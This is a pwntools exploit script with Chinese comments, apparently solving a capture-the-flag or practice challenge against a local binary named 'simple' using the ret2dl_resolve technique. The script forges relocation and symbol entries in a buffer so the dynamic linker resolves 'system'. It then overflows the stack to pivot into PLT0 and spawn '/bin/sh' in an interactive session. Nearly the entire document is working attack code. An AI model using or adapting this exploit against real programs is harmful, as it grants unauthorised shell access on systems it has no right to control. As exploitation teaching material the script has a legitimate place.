# encoding: utf-8

'''
dl_reslove(link_map, index) 流程
1. reloc = .rela.plt + index
2. sym = .dynsym + ((reloc->r_info)>>0x20)
3. assert(reloc->r_info & 0xff == 7 )
4. sym->st_other & 3 要等於 0
6. 搜尋字串 [.dynsym + sym->st_name]
7. 將搜尋到的位址寫入 reloc->r_offset
8. return 到該位址

reloc:
r_offset +0
r_info   +4

sym:
st_name  +0
'''

from pwn import *

elf = ELF('./simple')
libc = ELF('./libc.so.6')
r = process('./simple')

buf = elf.symbols['buf']
dl_resolve = 0x80482f0

# 控制 reloc 的位址
reloc = buf
rela_plt = 0x080482b0
index = reloc - rela_plt
print(hex(index))

# 控制 sym 的位址
offset = 7
sym = reloc + offset*0x4
dynsym = 0x080481cc
sym_idx = (sym-dynsym)//16
print(hex(sym_idx))
assert(sym_idx*16+dynsym == sym)
r_info = (sym_idx << 0x8) + 0x7

# 控制 sym->st_name 的位址
dynstr = 0x0804822c
system_str_addr = buf+0x70
st_name = system_str_addr - dynstr
sh = buf+0x78


r_offset = buf # 也可做 GOT Hijack
# 偽造 reloc 和 sym
r.sendlineafter('buf:', (flat(r_offset, r_info) + p32(0)*(offset-1)+flat(st_name)).ljust(0x70, '\x00')+flat('system\x00\x00', '/bin/sh\x00')+flat(dl_resolve, index))

# bof 的 rop , 先控 rdi 參數, 再跳 dl_resolve, 這邊 dl_resolve 是跳 PLT0
# PLT0 再跳 dl_resolve 會將參數 (link_map, index) push 到 stack, 詳情請 gdb, 這邊我們控制 index
gdb.attach(r, 'b *0x80484dc\nc\nsi 61')
r.sendlineafter('a:', 'b'*1+flat(buf+0x84, 0, 0)) # pop ecx, ebx, ebp, lea esp, [ecx-0x4], ret

r.interactive()